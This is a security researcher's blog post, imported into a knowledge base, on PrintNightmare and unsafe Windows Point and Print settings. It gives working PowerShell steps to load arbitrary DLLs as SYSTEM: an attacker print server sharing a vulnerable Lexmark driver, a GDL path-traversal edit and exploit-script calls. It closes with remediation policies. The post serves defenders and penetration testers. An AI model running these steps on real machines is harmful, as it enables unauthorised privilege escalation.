@@ -1,0 +1,727 @@
+---
+source: imported
+source_type: markdown
+original_path: knowledge-inbox/blogs-incoming/2024-01-18_a-practical-guide-to-printnightmare-in-2024.md
+original_filename: 2024-01-18_a-practical-guide-to-printnightmare-in-2024.md
+title: A Practical Guide to PrintNightmare in 2024
+category: documents
+detected_topics:
+- command-injection
+- sso
+- access-control
+- path-traversal
+- automation-abuse
+- api-security
+tags:
+- imported
+- documents
+- command-injection
+- sso
+- access-control
+- path-traversal
+- automation-abuse
+- api-security
+language: en
+raw_sha256: 2aa09f18e00e1faab1bb3dc2e7022b87a06b09aa2c4d13b28c3f94dc0444ec75
+text_sha256: fbe39edb633bef3377c522bc44d62746814698cb56c9d96161b1247e4c8e3531
+ingested_at: '2026-06-28T07:32:30Z'
+sensitivity: unknown
+redactions_applied: true
+---
+
+# A Practical Guide to PrintNightmare in 2024
+
+## Source Metadata
+
+- Original Path: knowledge-inbox/blogs-incoming/2024-01-18_a-practical-guide-to-printnightmare-in-2024.md
+- Source Type: markdown
+- Detected Topics: command-injection, sso, access-control, path-traversal, automation-abuse, api-security
+- Ingested At: 2026-06-28T07:32:30Z
+- Redactions Applied: True
+- Raw SHA256: `2aa09f18e00e1faab1bb3dc2e7022b87a06b09aa2c4d13b28c3f94dc0444ec75`
+- Text SHA256: `fbe39edb633bef3377c522bc44d62746814698cb56c9d96161b1247e4c8e3531`
+
+
+## Content
+
+---
+title: "A Practical Guide to PrintNightmare in 2024"
+page_title: "A Practical Guide to PrintNightmare in 2024 | itm4n's blog"
+url: "https://itm4n.github.io/printnightmare-exploitation/"
+final_url: "https://itm4n.github.io/printnightmare-exploitation/"
+authors: ["Clément Labro (@itm4n)"]
+bugs: ["Local Privilege Escalation", "Windows"]
+publication_date: "2024-01-18"
+added_date: "2024-02-01"
+source: "pentester.land/writeups.json"
+original_index: 520
+---
+
+# A Practical Guide to PrintNightmare in 2024
+
+Posted  Jan 28, 2024  Updated  Nov 9, 2025 
+
+By _[itm4n](https://infosec.exchange/@itm4n) _
+
+_21 min_ read
+
+A Practical Guide to PrintNightmare in 2024 __
+
+Contents __
+
+A Practical Guide to PrintNightmare in 2024
+
+__
+
+Although PrintNightmare and its variants were theoretically all addressed by Microsoft, it is still affecting organizations to this date, mainly because of quite confusing group policies and settings. In this blog post, I want to shed a light on those configuration issues, and hopefully provide clear guidance on how to remediate them.
+
+##  “PrintNightmare” and “Point and Print” __
+
+Unless you’ve been living under a rock for the past 3 years, you should have heard about “PrintNightmare”, but I’ll begin with a quick recap to make sure we are on the same page.
+
+Originally, “PrintNightmare” was the name given to a vulnerability in the Print Spooler service which could be exploited to achieve Remote Code Execution (RCE) or Local Privilege Escalation (LPE) on a Windows host, provided that an attacker had obtained network access and domain credentials, or gained local access in the context of a regular user. This turned out to be a real “nightmare” because this finding eventually led to the discovery of multiple variants of the same initial flaw, in part resulting from incomplete patches.
+
+More specifically, the problematic feature is “Point and Print”. According to Microsoft, [Point and Print](https://learn.microsoft.com/en-us/windows-hardware/drivers/print/introduction-to-point-and-print) “ _refers to the capability of allowing a user to create a connection to a remote printer without providing disks or other installation media_ ”. In other words, it ~~allows~~ allowed you to add a printer, either directly or through a print server, and install its driver automatically, all without requiring admin privileges, the aim being to provide a _plug-and-play_ experience to the end users.
+
+[![Point and Print](/assets/posts/2024-01-28-printnightmare-exploitation/01_pnp-diagram.png)](/assets/posts/2024-01-28-printnightmare-exploitation/01_pnp-diagram.png) _Point and Print_
+
+> Since Windows Vista, printer drivers can only be **user-mode** drivers. As stated in the [documentation](https://learn.microsoft.com/en-us/windows-hardware/drivers/print/choosing-user-mode-or-kernel-mode), if an application attempts to install a kernel-mode driver, “ _The`AddPrinterDriver` and `AddprinterDriverEx` functions will fail with the error code `ERROR_KM_DRIVER_BLOCKED`_”. That being said, it does not prevent printer vendors from distributing regular kernel-mode drivers, alongside their user-mode printer drivers, if they deem necessary.
+
+When adding a printer, an associated printer driver is required to be installed. This driver can be either “**non package aware** ” or “**package aware** ”. This notion of [package aware drivers](https://learn.microsoft.com/en-us/windows-hardware/drivers/print/point-and-print-with-driver-packages) was first introduced in Windows Vista.
+
+It is possible to see whether a printer driver is “package aware” thanks to the “Print Management” MMC snap-in, or simply using PowerShell.
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+  10
+  11
+  12
+  
+
+| 
+  
+  
+  PS C:\Users\Administrator> Get-PrinterDriver | select Name,IsPackageAware
+  
+  Name  IsPackageAware
+  ----  --------------
+  Microsoft XPS Document Writer v4  True
+  Microsoft Print To PDF  True
+  Microsoft enhanced Point and Print compatibility driver  True
+  Lexmark Universal v2  True
+  Canon MX920 series Printer  True
+  Canon MX920 series FAX  False
+  Brady BBP11-24L  True
+  Microsoft enhanced Point and Print compatibility driver  True
+  
+  
+---|---  
+`
+
+As can be seen on the command output above, “package aware” drivers are way more common than their “non package aware” counterparts nowadays.
+
+This difference is essential because it determines what type of configuration needs to be applied to the “Point and Print” feature in order to allow users to install printers, as we will see in the next parts.
+
+##  Point and Print restricted to administrators __
+
+Following the PrintNightmare saga, Microsoft decided to [address the problem](https://support.microsoft.com/en-gb/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872) globally by restricting the installation of printer drivers to administrators only, but with the possibility for system administrators to override this policy when necessary. This has been the default behavior since August 10, 2021.
+
+For organizations that didn’t anticipate this change, the consequence was that some users were no longer able to print from their Windows PC. For example, when attempting to add a shared printer with a package aware driver from the “Printers & scanners” settings, you would get the following error message.
+
+[![Printer installation failed](/assets/posts/2024-01-28-printnightmare-exploitation/02_add-printer-access-denied.png)](/assets/posts/2024-01-28-printnightmare-exploitation/02_add-printer-access-denied.png) _Printer installation failed_
+
+The error `#740` is a standard [Win32 error code](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--500-999-) that translates to “ _The requested operation requires elevation_ ”. In other words, administrator privileges are required if you want to add a remote printer.
+
+[![Error code 740](/assets/posts/2024-01-28-printnightmare-exploitation/03_error-code-740.png)](/assets/posts/2024-01-28-printnightmare-exploitation/03_error-code-740.png) _Error code 740_
+
+Therefore, to allow regular users to install a shared printer, the policy [Limits print driver installation to Administrators](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::RestrictDriverInstallationToAdministrators) (_Computer Configuration > Policies > Administrative Templates > Printers_) must be disabled, as mentioned earlier.
+
+> This configuration is unsafe!
+
+[![Configuring the policy "Limits print driver installation to Administrators"](/assets/posts/2024-01-28-printnightmare-exploitation/04_limits-print-driver-installation-policy.png)](/assets/posts/2024-01-28-printnightmare-exploitation/04_limits-print-driver-installation-policy.png) _Configuring the policy “Limits print driver installation to Administrators”_
+
+When this setting is applied to the target workstations, the following value is created (or updated) in the registry.
+
+____
+
+`
+  
+  
+  1
+  2
+  
+
+| 
+  
+  
+  HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
+  RestrictDriverInstallationToAdministrators -> 0 (= Disabled)
+  
+  
+---|---  
+`
+
+> If the value `RestrictDriverInstallationToAdministrators` doesn’t exist or is set to `1`, the installation of printer drivers is restricted to administrators only.
+
+If we try to add our printer again, it works!
+
+[![Installing a printer using a package aware driver](/assets/posts/2024-01-28-printnightmare-exploitation/05_printer-package-driver-installing.png)](/assets/posts/2024-01-28-printnightmare-exploitation/05_printer-package-driver-installing.png) _Installing a printer using a package aware driver_
+
+But what about printers using **non package aware** drivers? Well, in that case, we will be presented with a different dialog box, which ultimately results in a UAC prompt being displayed upon clicking “Continue”.
+
+[![Attempting to install a non package aware printer driver](/assets/posts/2024-01-28-printnightmare-exploitation/06_add-printer-prompt.png)](/assets/posts/2024-01-28-printnightmare-exploitation/06_add-printer-prompt.png) _Attempting to install a non package aware printer driver_
+
+If we don’t have administrator privileges, we have no other choice but to abort the operation, which results in the printer failing to install.
+
+##  Point and Print restrictions __
+
+In the context of an organization, if users cannot install printers that come with non package aware drivers, this could be a problem. Therefore, it might be tempting to disable the prompt we saw earlier by configuring the [Point and Print Restrictions](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::PointAndPrint_Restrictions) policy.
+
+More specifically, this policy contains two settings governing security prompts.
+
+  * “ _When installing drivers for a new connection_ ”
+  * “ _When updating drivers for an existing connection_ ”
+
+By setting these values to “ _Do not show warning or elevation prompt_ ”, we can disable the prompts, and thus obtain a behavior similar to package aware drivers.
+
+> This configuration is highly unsafe, as we will see shortly!
+
+[![Disabling Point and Print security prompts](/assets/posts/2024-01-28-printnightmare-exploitation/07_pnp-restrictions-disable-prompts.png)](/assets/posts/2024-01-28-printnightmare-exploitation/07_pnp-restrictions-disable-prompts.png) _Disabling Point and Print security prompts_
+
+Applying this policy on the target machines will result in the following values being set in the registry.
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  
+
+| 
+  
+  
+  HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint
+  NoWarningNoElevationOnInstall -> 1 (= Do not show warning or elevation prompt)
+  UpdatePromptSettings -> 2 (= Do not show warning or elevation prompt)
+  
+  
+---|---  
+`
+
+> If the values `NoWarningNoElevationOnInstall` and `UpdatePromptSettings` don’t exist, or are set to `0`, the security prompts are always shown.
+
+And if we try to add our printer again, it works! We now have a configuration that allows users to install both package aware and non package aware printer drivers.
+
+[![Installing a printer using a non package aware drive](/assets/posts/2024-01-28-printnightmare-exploitation/08_printer-non-package-installing.png)](/assets/posts/2024-01-28-printnightmare-exploitation/08_printer-non-package-installing.png) _Installing a printer using a non package aware driver_
+
+##  PrintNightmare is back! ![:ghost:](https://github.githubassets.com/images/icons/emoji/unicode/1f47b.png)__
+
+If you were to disable the Point and Print security prompts as described previously, you would allow users to install non package aware printer drivers, but you would also **make the machine vulnerable** to the original [PrintNightmare](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) exploit. This is documented in the KB article [KB5005010](https://support.microsoft.com/en-gb/topic/kb5005010-restricting-installation-of-new-printer-drivers-after-applying-the-july-6-2021-updates-31b91c02-05bc-4ada-a7ea-183b129578a7).
+
+[![Warning about Point and Print security prompts settings](/assets/posts/2024-01-28-printnightmare-exploitation/09_pnp-restrictions-ms-warning.png)](/assets/posts/2024-01-28-printnightmare-exploitation/09_pnp-restrictions-ms-warning.png) _Warning about Point and Print security prompts settings_
+
+A vulnerable Point and Print configuration would be as follows.
+
+  * The setting `RestrictDriverInstallationToAdministrators` is set to `0`, so that users can install printer drivers.
+  * The setting `NoWarningNoElevationOnInstall` is set to `1`, so that no elevation prompt is shown when installing a printer driver.
+
+> Disabling security prompts renders other settings completely useless. So, even if you set a list of **approved servers** , or if you limit Point and Print to machines in the **forest** , the machine will still be vulnerable.
+
+In this configuration, the exploitation is straightforward. It basically comes down to calling `AddPrinterDriverEx` with the appropriate flags, and passing a `DRIVER_INFO` structure containing the absolute path of a DLL that will be loaded by the Print Spooler service.
+
+You will find many exploits online, but the one I would recommend is the PowerShell script [CVE-2021-34527.ps1](https://github.com/JohnHammond/CVE-2021-34527) developed by [Caleb Stewart](https://github.com/calebstewart) and [John Hammond](https://github.com/JohnHammond). You can either let the script use its embedded DLL (which creates a new local administrator account when loaded), or pass the absolute path of your own DLL. Alternatively, you could also use my own script [PointAndPrint.ps1](https://github.com/itm4n/Pentest-Windows/tree/main/PointAndPrint), which is highly inspired by theirs.
+
+____
+
+`
+  
+  
+  1
+  2
+  
+
+| 
+  
+  
+  . .\PointAndPrint.ps1
+  Invoke-PointAndPrintExploit -DllPath "$HOME\Downloads\payload.dll"
+  
+  
+---|---  
+`
+
+> It’s important to specify an **absolute path** , and preferably **on the local file system**. The reason for this is that the DLL’s path will be interpreted in the context of the Print Spooler service, by the `LocalSystem` account. Therefore, a relative path is likely to point to a location that is different from yours, and your network paths (_e.g._ mounted file shares) might not even be accessible.
+
+Below is a short video showing the exploit. Here, I used a DLL that simply spawns a new `cmd.exe` process on the current user’s desktop.
+
+Your browser does not support the video tag. Here is a [link to the video file](/assets/posts/2024-01-28-printnightmare-exploitation/10_printnightmare-exploit.webm) instead.  _Exploitation of the PrintNightmare vulnerability_
+
+> It should be noted that, when the exploit is successful, the payload DLL is copied to the system folder. My version of the exploit uses the flag `DPD_DELETE_UNUSED_FILES` when calling `DeletePrinterDriverEx` in order to let the Print Spooler service delete the file automatically.
+
+In summary, if the Point and Print security prompts are disabled, a local attacker can simply load an arbitrary DLL in the context of the Print Spooler service. This is the easiest exploit variant, and it works even if a list of approved Point and Print servers is configured!
+
+##  Package Point and Print __
+
+Now, let’s rewind a bit, and say that we didn’t disable the security prompts. In other words, we assume that the policy “Limits print driver installation to Administrators” is disabled, and all the other settings are left untouched so that default values are applied.
+
+In these conditions, we saw that we cannot install a non package aware printer driver, but we can leverage **Package Point and Print** to install a printer shared by a print server. To better understand what happens when we do that, we first need to take a look at the list of default printer drivers (see screenshot below).
+
+[![List of default printer drivers](/assets/posts/2024-01-28-printnightmare-exploitation/11_list-default-drivers.png)](/assets/posts/2024-01-28-printnightmare-exploitation/11_list-default-drivers.png) _List of default printer drivers_
+
+Knowing this, it is indeed easier to show that the Print Spooler downloads the appropriate driver from the remote print server, and installs it locally. The screenshot below shows a Canon driver being automatically installed in the background.
+
+[![A printer driver being automatically installed](/assets/posts/2024-01-28-printnightmare-exploitation/12_driver-automatically-installed.png)](/assets/posts/2024-01-28-printnightmare-exploitation/12_driver-automatically-installed.png) _A printer driver being automatically installed_
+
+Basically, we asked the Print Spooler to connect to a remote print server, and it loaded a driver from this location. So, if we instead coerce it to connect to a server we control, we should be able to make it load a custom driver and thus execute arbitrary code as `NT AUTHORITY\SYSTEM`, right?
+
+As you may imagine, it’s not that simple. In the article [Point and Print with Driver Packages](https://learn.microsoft.com/en-us/windows-hardware/drivers/print/point-and-print-with-driver-packages), you can read that “ _Driver signing and driver integrity are checked on the print client_ ”. Furthermore, in the article [Use Group Policy settings to control printers in Active Directory](https://learn.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad-printer), you can also read that “ _When using package point and print, client computers will check the driver signature of all drivers that are downloaded from print servers_ ”.
+
+In the case of our Canon driver, we can see that it has a [WHQL signature](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/whql-release-signature) because the EKU field of its certificate contains the OID `1.3.6.1.4.1.311.10.3.5`. This means that it went through a validation process before being digitally signed by Microsoft.
+
+[![A printer driver signature](/assets/posts/2024-01-28-printnightmare-exploitation/13_driver-signature.png)](/assets/posts/2024-01-28-printnightmare-exploitation/13_driver-signature.png) _A printer driver signature_
+
+> If you open the properties of a printer driver’s binary file (_e.g._ one of its DLLs), you won’t find any signature. That’s because, “ _A WHQL release signature consists of a digitally-signed catalog file_ ” (see [WHQL Release Signature](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/whql-release-signature)). In the example above, this file is `MX920P6.cat`.
+
+In short, although we can point to any server, we cannot load a custom driver because of signing requirements. One could argue that it is not impossible to build a malicious driver and still pass the WHQL validation, but there is a much simpler solution.
+
+##  Bring your own vulnerable printer driver __
+
+When it comes to bypassing advanced protections such as Protected Processes or Endpoint Detection and Response (EDR) solutions, a now well known technique called “ _Bring Your Own (Vulnerable) Driver_ ” is often employed. For instance, tools such as [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) or [EDRSandBlast](https://github.com/wavestone-cdt/EDRSandblast) leverage legitimate drivers that provide read/write access to the Kernel in order to circumvent security mechanisms by altering data that is essential to their functioning.
+
+Although printer drivers are not kernel-mode drivers, the same concept can be applied to Package Point and Print, for a slightly different purpose. Rather than leveraging administrator privileges to access the kernel, we want to gain those administrator privileges.
+
+To do that, we will first need to set up a print server and share a fake printer that uses a legitimate but vulnerable driver. Then, we will leverage Package Point and Print to coerce the Print Spooler service to install this driver on the target. Finally, we will exploit it to gain `LocalSystem` privileges.
+
+[![Downloading a vulnerable printer driver](/assets/posts/2024-01-28-printnightmare-exploitation/14_download-vulnerable-printer-driver-diagram.png)](/assets/posts/2024-01-28-printnightmare-exploitation/14_download-vulnerable-printer-driver-diagram.png) _Downloading a vulnerable printer driver_
+
+This particular attack was implemented by [@Junior_Baines](https://twitter.com/Junior_Baines) in a turnkey tool called [Concealed Position](https://github.com/jacob-baines/concealed_position). The project consists of a single executable that embeds both a server and a client, and a collection of four vulnerable printer drivers.
+
+There are at least two main issues that make it hardly usable nowadays though. First and foremost, it is flagged as malicious, so it cannot be easily run without modifying the code, or at least packing the executable. Second, it relies on anonymous access to the `print$` share, which is likely to be blocked because of [restrictions enforced in some recent versions of Windows](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/guest-access-in-smb2-is-disabled-by-default).
+
+To solve these issues, I split the exploit chain into three steps that I reimplemented in PowerShell for easier reproducibility. Step 1 (in red) and step 2 (in blue) are already illustrated on the previous diagram.
+
+  1. **ATTACKER** (as an administrator): create a fake shared printer using a vulnerable printer driver.
+  2. **TARGET** (as a regular user): add the remote shared printer to trigger the installation of its driver locally.
+  3. **TARGET** (as a regular user): exploit the printer driver to gain `LocalSystem` privileges.
+
+Lastly, as I mentioned previously, [Concealed Position](https://github.com/jacob-baines/concealed_position) offers exploits for four vulnerable drivers. Though, for the sake of the demonstration, I selected only one: “ACIDDAMAGE”. It exploits a basic file permission issue in a Lexmark driver ([CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449)), as we will see further down.
+
+###  1\. Creating a fake shared printer (Attacker)__
+
+We first need to download and install a known vulnerable printer driver, such as the Lexmark one, on our machine. Then, we will use the PowerShell cmdlets `Add-PrinterDriver` and `Add-Printer` to create the fake shared printer. All the necessary commands are shown below.
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+  10
+  11
+  12
+  13
+  14
+  15
+  16
+  17
+  18
+  19
+  20
+  21
+  
+
+| 
+  
+  
+  $DriverUrl = "https://github.com/jacob-baines/concealed_position/raw/main/cab_files/ACIDDAMAGE/LMUD1o40.cab"
+  $Username = "user"
+  $Password=***REDACTED***
+  $SecurePassword=***REDACTED*** -String $Password -AsPlainText -Force
+  New-LocalUser -Name $Username -Password $SecurePassword | Out-Null
+  # Download the CAB file containing the vulnerable driver.
+  Invoke-WebRequest -Uri $DriverUrl -OutFile ".\LMUD1o40.cab"
+  # Create the directory that will contain the extracted files.
+  New-Item -Path ".\ACIDDAMAGE\" -ItemType Directory | Out-Null
+  # Expand the CAB file in the output directory.
+  expand.exe ".\LMUD1o40.cab" -F:* ".\ACIDDAMAGE" | Out-Null
+  # Install the printer driver.
+  pnputil.exe /add-driver ".\ACIDDAMAGE\LMUD1o40.inf" /install
+  # Add it as a printer driver.
+  Add-PrinterDriver -Name "Lexmark Universal v2"
+  # Create a shared printer that uses this printer driver.
+  Add-Printer -Name "ACIDDAMAGE" -DriverName "Lexmark Universal v2" -PortName "LPT1:" -PrintProcessor "WinPrint" -Datatype "RAW" -Shared
+  # Enable File and Printer Sharing firewall rules (optional if your firewall is
+  # disabled).
+  # https://learn.microsoft.com/en-us/powershell/module/netsecurity/enable-netfirewallrule#example-1
+  Enable-NetFirewallRule -Group "@FirewallAPI.dll,-28502"
+  
+  
+---|---  
+`
+
+Here is a short video showing all the set-up.
+
+Your browser does not support the video tag. Here is a [link to the video file](/assets/posts/2024-01-28-printnightmare-exploitation/15_fake-shared-printer-creation.webm) instead.  _Creation of a print server and a shared printer with a vulnerable driver_
+
+The code snippet below shows all the commands necessary to restore your machine to its original state, once you no longer need the shared printer. They should be self-explanatory.
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+  10
+  
+
+| 
+  
+  
+  Disable-NetFirewallRule -Group "@FirewallAPI.dll,-28502"
+  Remove-Printer -Name "ACIDDAMAGE" -Verbose
+  Restart-Service -Name "Spooler" -Force
+  Remove-PrinterDriver -Name "Lexmark Universal v2" -Verbose
+  (pnputil.exe /enum-drivers | Select-String "lmud1o40.inf" -Context 1,0) -Match "(oem.+\.inf)"
+  $DriverName = $Matches[0]
+  pnputil.exe /delete-driver $DriverName /uninstall
+  Remove-Item -Path ".\ACIDDAMAGE\" -Recurse -Force
+  Remove-Item -Path ".\LMUD1o40.cab" -Force
+  Remove-LocalUser -Name $Username
+  
+  
+---|---  
+`
+
+###  2\. Installing the vulnerable printer driver (Target)__
+
+On the client side (_i.e._ the target), we should now be able to execute the following commands to connect to the shared printer and coerce the Print Spooler service to download and install the vulnerable printer driver locally.
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+  10
+  11
+  12
+  13
+  
+
+| 
+  
+  
+  $Server = "192.168.200.226" # IP or hostname of the attacker's machine
+  $Username = "user"
+  $Password=***REDACTED***
+  $PrinterName = "\\$($Server)\ACIDDAMAGE"
+  
+  # Store remote user credentials in the credential manager
+  cmdkey.exe /add:$Server /user:$Username /pass:$Password
+  # Add the shared printer
+  Add-Printer -ConnectionName $PrinterName
+  
+  # Cleanup
+  Remove-Printer -Name $PrinterName
+  cmdkey.exe /delete:$Server
+  
+  
+---|---  
+`
+
+> The built-in tool `cmdkey.exe` stores the credentials in the Credential Vault, so that Windows can authenticate against the attacker’s server transparently. I tried several other solutions, but this option seemed the simplest and the most reliable.
+
+If all goes well, the output of each command should be empty, and the printer driver “Lexmark Universal v2” should appear in the list of installed drivers. You can double check using the command `Get-PrinterDriver -Name "Lexmark Universal v2"` if you wish.
+
+[![Connecting to the fake shared printer from the target machine](/assets/posts/2024-01-28-printnightmare-exploitation/16_add-fake-printer-from-client.png)](/assets/posts/2024-01-28-printnightmare-exploitation/16_add-fake-printer-from-client.png) _Connecting to the fake shared printer from the target machine_
+
+> At this stage, you can remove the fake printer on both client and server sides as we no longer need it.
+
+###  3\. Exploiting the printer driver (Target)__
+
+Here comes the fun part! Now that the vulnerable printer driver is installed on the target, we want to exploit it to gain `LocalSystem` privileges.
+
+The very first thing to do is create a dummy printer that uses this driver. This can be achieved through the `AddPrinter` Win32 API, which I wrapped in a PowerShell cmdlet.
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+  
+
+| 
+  
+  
+  . .\PointAndPrint.ps1
+  $PrinterInfo = New-Object WinSpool+PRINTER_INFO_2
+  $PrinterInfo.pPortName = "LPT1:"
+  $PrinterInfo.pDriverName = "Lexmark Universal v2"
+  $PrinterInfo.pPrinterName = "ACIDDAMAGE"
+  $PrinterInfo.pPrintProcessor = "WinPrint"
+  $PrinterInfo.pDataType = "RAW"
+  $PrinterInfo.Attributes = 0x00001000 + 0x00000020
+  $PrinterHandle = Add-WinSpoolPrinter -PrinterInfo $PrinterInfo
+  
+  
+---|---  
+`
+
+[![Creating a printer using a vulnerable Lexmark driver](/assets/posts/2024-01-28-printnightmare-exploitation/17_add-printer-programdata-permissions.png)](/assets/posts/2024-01-28-printnightmare-exploitation/17_add-printer-programdata-permissions.png) _Creating a printer using a vulnerable Lexmark driver_
+
+When doing that, a folder named `Lexmark Universal v2` is created in `C:\ProgramData\`, and an explicit DACL is set to grant `Full Control` to `Authenticated Users` and `Guests`. In this folder, a file named `Universal Color Laser.gdl` can be found.
+
+> GDL stands for [Generic Description Language](https://learn.microsoft.com/en-us/windows-hardware/drivers/print/generic-description-language). A GDL file is an XML-based document that basically describes the driver, its components, and its dependencies.
+
+The part of the GDL file we are interested in is highlighted below. As you can see, it references DLL filenames!
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+  
+
+| 
+  
+  
+  <!-- ... -->
+  <CONSTRUCT Name="*Feature" Instance="RESDLL">
+  <!-- ... -->
+  <CONSTRUCT Name="*Option" Instance="COMMON_RESDLL">
+  <GDL_ATTRIBUTE Name="*Name" xsi:type="GDLW_string">LMUD1OUE.DLL</GDL_ATTRIBUTE>
+  </CONSTRUCT>
+  <!-- ... -->
+  </CONSTRUCT>
+  <!-- ... -->
+  
+  
+---|---  
+`
+
+This GDL file is parsed when creating a printer that uses this driver. Since we have `Full Control`, we can modify it, and inject `..\` characters to perform a basic path traversal attack, as shown below.
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  
+
+| 
+  
+  
+  <CONSTRUCT Name="*Option" Instance="COMMON_RESDLL">
+  <GDL_ATTRIBUTE Name="*Name" xsi:type="GDLW_string">..\..\..\..\..\..\foo123.DLL</GDL_ATTRIBUTE>
+  </CONSTRUCT>
+  
+  
+---|---  
+`
+
+Next, we need to remove our previously created printer, because we want to coerce the Print Spooler service to recreate it using this modified version of the GDL file.
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  4
+  5
+  6
+  7
+  
+
+| 
+  
+  
+  # Remove the previously created printer.
+  Remove-WinSpoolPrinter -PrinterHandle $PrinterHandle
+  Close-WinSpoolPrinter -PrinterHandle $PrinterHandle
+  # Create the dummy printer again to trigger the arbitrary DLL load.
+  $PrinterHandle = Add-WinSpoolPrinter -PrinterInfo $PrinterInfo
+  Remove-WinSpoolPrinter -PrinterHandle $PrinterHandle
+  Close-WinSpoolPrinter -PrinterHandle $PrinterHandle
+  
+  
+---|---  
+`
+
+Using Process Monitor in the background, we can see that the driver installer indeed tries to access the file `C:\foo123.dll`, which does not exist in this case, but you get the point. By adjusting the path, we will be able to make it load a DLL from an arbitrary location.
+
+[![Triggering an arbitrary DLL load](/assets/posts/2024-01-28-printnightmare-exploitation/18_add-printer-procmon-dll-path-traversal.png)](/assets/posts/2024-01-28-printnightmare-exploitation/18_add-printer-procmon-dll-path-traversal.png) _Triggering an arbitrary DLL load_
+
+Although this exploit is trivial, it requires a few more steps than the two previous stages, so I automated everything in my PowerShell script [PointAndPrint.ps1](https://github.com/itm4n/PrivescCheck/releases/latest/download/PointAndPrint.ps1). Running it is very simple, you just have to pass the path of your DLL through the `-DllPath` option. This time, it doesn’t matter if the path is relative or absolute since the file will be copied to a location chosen by the script.
+
+____
+
+`
+  
+  
+  1
+  2
+  
+
+| 
+  
+  
+  . .\PointAndPrint.ps1;
+  Invoke-PrinterDriverExploit -DllPath "$HOME\Downloads\payload.dll"
+  
+  
+---|---  
+`
+
+Below is a video showing the exploit script in action. As you will see, the DLL is loaded multiple times (12 in my case), so keep that in mind when crafting your payload.
+
+Your browser does not support the video tag. Here is a [link to the video file](/assets/posts/2024-01-28-printnightmare-exploitation/19_vulnerable-driver-exploit.webm) instead.  _Exploitation of the PrintNightmare vulnerability using a vulnerable printer driver_
+
+No need to say that you will have to manually remove the installed driver once you have obtained `LocalSystem` privileges, otherwise the machine will remain vulnerable.
+
+____
+
+`
+  
+  
+  1
+  2
+  3
+  4
+  5
+  6
+  7
+  
+
+| 
+  
+  
+  Get-PrinterDriver -Name "Lexmark Universal v2" # This should return the vulnerable driver.
+  Remove-PrinterDriver -Name "Lexmark Universal v2"
+  # Retrieve the name of driver on the current system
+  (pnputil.exe /enum-drivers | Select-String "lmud1o40.inf" -Context 1,0) -Match "(oem.+\.inf)"
+  $DriverName = $Matches[0]
+  pnputil.exe /delete-driver $DriverName /uninstall
+  Get-PrinterDriver -Name "Lexmark Universal v2" # This should throw an exception.
+  
+  
+---|---  
+`
+
+##  Fixing our Point and Print configuration __
+
+It’s all well and good, but how do we configure our system to prevent this kind of attack? The most straightforward way would be to just get rid of the Print Spooler service altogether by disabling it. But of course, here we assume that allowing users to install and use printers is a requirement. So how do we do that safely?
+
+> **2024-10-05 Update** : The configuration recommended below is actually not completely safe, it is still prone to _Man-in-the-Middle_ attacks. For more information, please check out this post: [The PrintNightmare is not Over Yet](/printnightmare-not-over/).
+
+The answer lies in a couple of Group Policies in _Computer Configuration > Policies > Administrative Templates > Printers_:
+
+  * [Only use Package Point and print](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::PackagePointAndPrintOnly)
+  * [Package Point and print - Approved servers](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::PackagePointAndPrintServerList_Win7)
+
+By enabling the policy [Only use Package Point and print](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::PackagePointAndPrintOnly) and configuring the policy [Package Point and print - Approved servers](https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.Printing::PackagePointAndPrintServerList_Win7), the Print Spooler service will only accept to install **signed printer drivers** from **trusted servers**.
+
+With such a configuration, attempts to connect to a malicious shared printer will result in the following error.
+
+[![Attempting to install a malicious printer before and after configuring a list or approved servers](/assets/posts/2024-01-28-printnightmare-exploitation/20_before-after-configuring-approved-servers.png)](/assets/posts/2024-01-28-printnightmare-exploitation/20_before-after-configuring-approved-servers.png) _Attempting to install a malicious printer before and after configuring a list or approved servers_
+
+And when trying to install a non package aware printer driver, the following exception will be raised. The error message is rather generic, but the error code [`0x800704ec`](https://www.magnumdb.com/search?q=800704ec) translates to `ERROR_ACCESS_DISABLED_BY_POLICY`.
+
+[![Attempting to install a non package aware printer driver](/assets/posts/2024-01-28-printnightmare-exploitation/21_package-point-and-print-only-result.png)](/assets/posts/2024-01-28-printnightmare-exploitation/21_package-point-and-print-only-result.png) _Attempting to install a non package aware printer driver_
+
+##  Key takeaways __
+
+I will conclude this blog post with a recap that will hopefully provide clear guidance to both system administrators and offensive security consultants.
+
+First of all, as an administrator, the one key thing to keep in mind is that “** _There is no combination of mitigations that is equivalent to setting RestrictDriverInstallationToAdministrators to 1_** ” (_i.e._ `Enabled`), as pointed out by Microsoft in the KB article [KB5005652](https://support.microsoft.com/en-gb/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872), which is also the default behavior on up-to-date machines.
+
